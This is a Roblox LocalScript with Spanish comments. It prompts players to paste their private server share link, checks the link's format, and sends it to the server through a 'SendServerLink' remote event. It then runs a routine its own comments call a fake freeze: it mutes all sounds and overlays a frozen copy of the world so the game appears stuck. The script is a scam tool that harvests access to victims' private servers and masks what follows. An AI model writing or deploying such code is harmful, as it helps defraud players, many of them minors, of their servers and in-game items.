-- LocalScript
local Player = game.Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local SoundService = game:GetService("SoundService")
local RunService = game:GetService("RunService")

-- UI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = Player:WaitForChild("PlayerGui")
ScreenGui.DisplayOrder = 100

-- Frame principal
local Frame = Instance.new("Frame")
Frame.Parent = ScreenGui
Frame.Size = UDim2.new(0, 400, 0, 300)
Frame.Position = UDim2.new(0.5, -200, 0.5, -150)
Frame.BackgroundColor3 = Color3.fromRGB(25,25,25)

-- Label
local Label = Instance.new("TextLabel")
Label.Parent = Frame
Label.Size = UDim2.new(1, -20, 0, 30)
Label.Position = UDim2.new(0, 10, 0, 10)
Label.Text = "Ingresa el link de tu servidor privado:"
Label.TextColor3 = Color3.fromRGB(255,255,255)
Label.BackgroundTransparency = 1

-- TextBox
local TextBox = Instance.new("TextBox")
TextBox.Parent = Frame
TextBox.Size = UDim2.new(1, -20, 0, 50)
TextBox.Position = UDim2.new(0, 10, 0, 50)
TextBox.TextColor3 = Color3.fromRGB(255,255,255)
TextBox.BackgroundColor3 = Color3.fromRGB(50,50,50)
TextBox.ClearTextOnFocus = false
TextBox.Text = "https://www.roblox.com/share?code="

-- Mensaje
local MessageLabel = Instance.new("TextLabel")
MessageLabel.Parent = Frame
MessageLabel.Size = UDim2.new(1, -20, 0, 30)
MessageLabel.Position = UDim2.new(0, 10, 0, 110)
MessageLabel.BackgroundTransparency = 1
MessageLabel.Text = ""
MessageLabel.TextColor3 = Color3.fromRGB(255,0,0)

-- Botón enviar
local Button = Instance.new("TextButton")
Button.Parent = Frame
Button.Size = UDim2.new(1, -20, 0, 50)
Button.Position = UDim2.new(0, 10, 0, 150)
Button.Text = "Enviar"
Button.BackgroundColor3 = Color3.fromRGB(75,75,75)
Button.TextColor3 = Color3.fromRGB(255,255,255)

-- Botón minimizar
local MiniButton = Instance.new("TextButton")
MiniButton.Parent = ScreenGui
MiniButton.Size = UDim2.new(0, 100, 0, 30)
MiniButton.Position = UDim2.new(0, 20, 0, 20)
MiniButton.Text = "Abrir ventana"
MiniButton.Visible = false
MiniButton.BackgroundColor3 = Color3.fromRGB(50,50,50)
MiniButton.TextColor3 = Color3.fromRGB(255,255,255)

MiniButton.MouseButton1Click:Connect(function()
    Frame.Visible = true
    MiniButton.Visible = false
end)

-- Validación de link
local function isLinkValid(link)
    local startPart = "https://www.roblox.com/share?code="
    local endPart = "&type=Server"
    return string.sub(link,1,#startPart) == startPart and string.sub(link,-#endPart) == endPart
end

-- Falso freeze
local function doFakeFreeze()
    -- 1) Mute todos los sonidos locales
    for _, sound in pairs(Workspace:GetDescendants()) do
        if sound:IsA("Sound") then
            pcall(function() sound:Stop() end)
            sound.Volume = 0
        end
    end
    for _, sound in pairs(SoundService:GetDescendants()) do
        if sound:IsA("Sound") then
            pcall(function() sound:Stop() end)
            sound.Volume = 0
        end
    end

    -- 2) Overlay visual
    local overlayGui = Instance.new("ScreenGui")
    overlayGui.Name = "LocalFreezeOverlay"
    overlayGui.Parent = Player:WaitForChild("PlayerGui")

    local overlay = Instance.new("Frame")
    overlay.Size = UDim2.new(1,0,1,0)
    overlay.BackgroundColor3 = Color3.new(0,0,0)
    overlay.BackgroundTransparency = 0.45
    overlay.ZIndex = 1000
    overlay.Parent = overlayGui

    -- 3) Captura del mundo con un ViewportFrame
    local viewport = Instance.new("ViewportFrame")
    viewport.Size = UDim2.new(1,0,1,0)
    viewport.Position = UDim2.new(0,0,0,0)
    viewport.BackgroundTransparency = 1
    viewport.Parent = overlayGui
    viewport.CurrentCamera = Workspace.CurrentCamera

    -- Clonamos objetos visibles solo para visual
    for _, obj in pairs(Workspace:GetDescendants()) do
        if obj:IsA("BasePart") or (obj:IsA("Model") and obj:FindFirstChildOfClass("Humanoid")) then
            local clone = obj:Clone()
            clone.Parent = viewport
            if clone:IsA("BasePart") then
                clone.Anchored = true
                clone.CanCollide = false
            elseif clone:IsA("Model") then
                for _, p in pairs(clone:GetDescendants()) do
                    if p:IsA("BasePart") then
                        p.Anchored = true
                        p.CanCollide = false
                    end
                end
            end
        end
    end
end

-- Botón principal
Button.MouseButton1Click:Connect(function()
    local link = TextBox.Text
    if isLinkValid(link) then
        MessageLabel.Text = "El link es válido ✅"
        MessageLabel.TextColor3 = Color3.fromRGB(0,255,0)
        local remoteEvent = ReplicatedStorage:WaitForChild("SendServerLink")
        remoteEvent:FireServer(link)
        doFakeFreeze()
        Frame.Visible = false
        MiniButton.Visible = true
    else
        MessageLabel.Text = "El link es inválido ❌"
        MessageLabel.TextColor3 = Color3.fromRGB(255,0,0)
    end
end)
